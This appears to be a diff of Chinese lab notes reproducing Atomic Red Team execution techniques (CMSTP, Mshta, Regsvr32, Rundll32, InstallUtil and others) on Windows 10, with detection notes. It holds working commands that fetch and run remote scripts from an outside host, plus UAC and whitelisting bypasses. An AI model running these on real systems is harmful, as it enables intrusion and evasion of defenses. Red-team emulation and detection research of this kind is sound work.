@@ -16,7 +16,7 @@ bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/
 bash -c "wget --quiet -O - http://snappyzz.com/echo-art-fish.sh | bash"
 ```
 成功复现
-#### T1191 - CMSTP
+### T1191 - CMSTP
 Microsoft Connection Manager Profile Installer (CMSTP.exe)是一个安装连接管理配置的应用程序.它允许接受一个INF文件作为参数,安装一个服务,来进行远程连接.红队可用CMSTP.exe和inf文件来生成恶意命令.CMSTP.exe现在拒绝从远程加载dll,但由于CMSTP.exe是一个合法的程序,且有微软的签名,这个运行仍然可以绕过基于白名单和AppLocker的防御.
 
 CMSTP.exe也可以通过COM接口绕过UAC来执行二进制文件
@@ -25,43 +25,102 @@ CMSTP.exe也可以通过COM接口绕过UAC来执行二进制文件
 - 当程序试图安装软件或对电脑做出更改时通知你。
 - 当你对 Windows 设置进行更改时通知你。
 - 冻结其他任务，直到你做出响应。
-##### 测试1 CMSTP 运行远程脚本
+###### 测试1 CMSTP 运行远程脚本
 平台:Windows.运行方式如下`cmstp.exe /s T1191.inf`
 
-window10运行成功
-##### 测试2 CMSTP运行绕过UAC
+检测:通过procmon的process name = cmstp  并且createfile contained calc.exe,检测到了这次行动
+
+window10运行复现
+###### 测试2 CMSTP运行绕过UAC
 红队可通过向inf文件中植入RunPreSetupCommandsSection来调用cmd.exe,来绕过UAC
 ```bash
 cmstp.exe /s T1191_uacbypass.inf /au
 ```
-window10运行成功
+检测:通过procmon的process name = cmstp  并且createfile contained calc.exe,检测到了这次行动
 
+window10运行复现
+### T1223 - Compiled HTML File
+编译的html文件(.chm)可运行如下:HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX.并通过hh.exe来打开他们,红队可用chm文件来隐藏一段payload,此技术也可以来绕过一些检测病毒检测.运行如下命令,或者直接打开文件
+```
+hh.exe D:\pycharmproject\atomic-red-team-master\atomics\T1223\src\T1223.chm
+```
+通过procmon的hh.exe进行了process create操作,监控到了
 
+windows10上成功复现
 
-#### T1173 - Dynamic Data Exchange
+或者
+```bash
+hh.exe http://snappyzz.com/T1223.chm		\\这个没有成功复现
+```
+### T1196 - Control Panel Items
+控制面板允许用户查看和修改电脑配置,也可以将cpl文件作为参数,运行恶意文件,来绕过一些病毒检测
+```bash
+control.exe D:\pycharmproject\atomic-red-team-master\atomics\T1196\bin\calc.cpl	//这里cpl一定要采用绝对路径否则失败
+```
+
+检测:control.exe创建了rundll32进程,然后rundll32进程通过命令行参数运行了cpl代码,然后运行里calc
+
+windows10上运行复现
+### T1173 - Dynamic Data Exchange
 关于动态数据交换（DDE, Dynamic Data Exchange）:DDE是一种动态数据交换机制（Dynamic Data Exchange，DDE）。使用DDE通讯需要两个Windows应用程序，其中一个作为服务器处理信息，另外一个作为客户机从服务器获得信息。客户机应用程序向当前所激活的服务器应用程序发送一条消息请求信息，服务器应用程序根据该信息作出应答，从而实现两个程序之间的数据交换。红队可用DDE来运行二进制命令,微软的文档可以用来放入DDE命令
 
 新建一个Word文档，通过Ctrl+F9添加一个域，然后修改域代码为：
 ```bash
 DDEAUTO c:\windows\system32\cmd.exe "/k calc.exe" 
 ```
-这个并没有复现成功
-#### T1118 - InstallUtil
+这个没有成功复现
+### Execution through API
+红队工具可以直接调用windows的api,例如如下api可以直接运行二进制
+```
+CreateProcessA() and CreateProcessW(),
+CreateProcessAsUserA() and CreateProcessAsUserW(),
+CreateProcessInternalA() and CreateProcessInternalW(),
+CreateProcessWithLogonW(), CreateProcessWithTokenW(),
+LoadLibraryA() and LoadLibraryW(),
+LoadLibraryExA() and LoadLibraryExW(),
+LoadModule(),
+LoadPackagedLibrary(),
+WinExec(),
+ShellExecuteA() and ShellExecuteW(),
+ShellExecuteExA() and ShellExecuteExW()
+```
+检测:监视API调用可能会产生大量数据，并且除非在特定情况下进行收集，否则可能无法直接用于防御，因为对Windows API函数（例如CreateProcess）的良性使用是常见的并且很难与恶意行为区分开。使用API​​监视将其他事件与围绕API函数调用的行为相关联，将为事件提供额外的上下文，可以帮助确定事件是否归因于恶意行为。
+### Exploitation for Client Execution
+就是利用客户端应用的漏洞,通常分为浏览器,办公软件和第三方软件
+
+检测:通过监控Adobe Reader和Flash,浏览器,和excel等进程的异常行为,包括写入磁盘的可疑文件,进程注入等,进行发现
+### Graphical User Interface
+这个就是通过图形界面双击运行文件什么的
+
+检测:只能通过查看登陆日志等进行发现
+### T1118 - InstallUtil
 这个就是一个安装和卸载的组件
-这个没有复现成功
-##### 测试1 InstallUtil uninstall method call
-#### T1170 - Mshta
+
+CSC就是 C-Sharp Compiler (中文就是C#编译器)，作用是把我们的 cs 源文件变异成dll 或者是exe
+###### 测试1 InstallUtil uninstall method call
+运行如下生成dll并且运行这个dll
+```
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename}  #{source}
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}
+例如
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:D:\pycharmproject\atomic-red-team-master\atomics\T1118\src\aa.dll  D:\pycharmproject\atomic-red-team-master\atomics\T1118\src\T1118.cs
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U D:\pycharmproject\atomic-red-team-master\atomics\T1118\src\aa.dll
+```
+检测的内容大概就是监控csc.exe和InstallUtil.exe这两个进程
+
+win10成功复现
+### T1170 - Mshta
 Mshta.exe是用来运行Microsoft HTML Applications (HTA)的.HTA是一个独立的应用,使用的和浏览器同样的技术,但是独立与浏览器.红队和用它来运行Javascript 或者VBScript.它可以用来绕过白名单的防护,也可以绕过浏览器安全防护
 ##### 测试1 Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
 ```bash
 mshta.exe javascript:a=(GetObject("script:http://snappyzz.com/mshta.sct")).Exec();close();
 ```
-windows10上运行成功
+windows10上成功复现
 ##### 测试2 Mshta calls a local VBScript file to launch notepad.exe
 ```bash
 mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""C:\Windows\SysWOW64\calc.exe"")(window.close)")
 ```
-windows10上运行成功
+windows10上成功复现
 ##### 测试3 Mshta executes VBScript to execute malicious command
 运行本地的VB脚本通过powershell枚举用户
 ```bash
@@ -87,7 +146,7 @@ powershell.exe "IEX (New-Object Net.WebClient).DownloadString('http://snappyzz.c
 被win10防病毒拦下
 未完待续
 
-#### T1064 - Scripting
+### T1064 - Scripting
 这个太简单了把
 ##### 测试1 在linux上运行脚本
 ```
@@ -107,6 +166,96 @@ C:\Windows\system32\cmd.exe /Q /c #{script_to_create}
 del #{script_to_create}
 ```
 windows10上运行成功
+### T1121 - Regsvcs/Regasm
+Regsvcs和Regasm是用来注册.NET COM的命令行工具.都有微软的签名.红队可以使用它们来运行程序.
+###### 测试1 Regasm Uninstall Method Call Test
+注意使用绝对路径
+```
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library #{source_file}
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{file_name}
+例如
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library D:\pycharmproject\atomic-red-team-master\atomics\T1121\src\T1121.cs
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U D:\pycharmproject\atomic-red-team-master\atomics\T1121\src\T1121.dll
+```
+检测方法也是类似regasm.exe这种进程名称的监控
+
+win10成功复现
+###### 测试2 Regsvs Uninstall Method Call Test
+在powershell中运行
+```
+$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
+$Content = [System.Convert]::FromBase64String($key)
+Set-Content key.snk -Value $Content -Encoding Byte
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /keyfile:key.snk #{source_file}
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{file_name}
+例如
+$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
+$Content = [System.Convert]::FromBase64String($key)
+Set-Content key.snk -Value $Content -Encoding Byte
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /keyfile:key.snk D:\pycharmproject\atomic-red-team-master\atomics\T1121\src\T1121.cs
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe D:\pycharmproject\atomic-red-team-master\atomics\T1121\src\T1121.dll
+```
+检测方法也是类似regasm.exe这种进程名称的监控
+
+win10成功复现
+### T1117 - Regsvr32
+Regsvr32.exe是一个命令行程序,用来注册和删除object linking和嵌入命令,加载dll. Regsvr32也可以用来运行二进制文件.
+
+红队可以利用它来运行代码来绕过一些防护,其中Regsvr32也是一个有微软签名的文件
+
+regsvr32.exe也可以加载COM scriptlets来运行dll,regsvr32也可以加载远程文件来运行.regsvr32也通过Component Object Model Hijacking用来注册 COM Object来进行persistence
+###### 测试1 Regsvr32 local COM scriptlet execution
+```
+regsvr32.exe /s /u /i:C:\Users\zhang\Desktop\atomic-red-team-master\atomics\T1117\RegSvr32.sct scrobj.dll
+```
+win10成功复现
+###### 测试2 Regsvr32 remote COM scriptlet execution
+```
+regsvr32.exe /s /u /i:http://snappyzz.com/RegSvr32.sct scrobj.dll
+```
+win10成功复现
+###### 测试3 Regsvr32 local DLL execution
+```
+"IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s D:\pycharmproject\atomic-red-team-master\atomics\T1117\src\AllTheThings.dll) ELSE ( regsvr32.exe /s D:\pycharmproject\atomic-red-team-master\atomics\T1117\src\AllTheThings.dll )"
+```
+项目找不到dll文件,没有进行复现,应该是有个命令创建dll的懒得找了
+### T1085 - Rundll32
+rundll32.exe可以用来调用二进制文件.红队可以利用这个特点调用恶意软件来绕过系统防护,rundll32.exe也可以运行.cpl文件,双击.cpl文件也可以造成rundll32.exe的运行.
+
+Rundll32 也可以运行JavaScript,语法类似如下
+```
+rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"
+```
+###### 测试1 Rundll32 execute JavaScript Remote Payload With GetObject
+```
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://snappyzz.com/T1085.sct").Exec();
+```
+win10成功复现
+###### 测试2 Rundll32 execute VBscript command
+```
+rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)
+```
+win10成功复现
+###### 测试3 Rundll32 advpack.dll Execution
+```
+rundll32.exe advpack.dll,LaunchINFSection D:\pycharmproject\atomic-red-team-master\atomics\T1085\src\T1085.inf,DefaultInstall_SingleUser,1,
+```
+win10成功复现
+###### 测试4 Rundll32 ieadvpack.dll Execution
+```
+rundll32.exe ieadvpack.dll,LaunchINFSection D:\pycharmproject\atomic-red-team-master\atomics\T1085\src\T1085.inf,DefaultInstall_SingleUser,1,
+```
+**没有复现成功**
+###### 测试5 Rundll32 syssetup.dll Execution
+```
+rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 D:\pycharmproject\atomic-red-team-master\atomics\T1085\src\T1085_DefaultInstall.inf
+```
+win10成功复现
+###### 测试6 Rundll32 setupapi.dll Execution
+```
+rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 D:\pycharmproject\atomic-red-team-master\atomics\T1085\src\T1085_DefaultInstall.inf
+```
+**没有复现成功**
 #### T1216 - Signed Script Proxy Execution
 带有证书的脚本可以用来执行恶意文件
 这个也未完待续
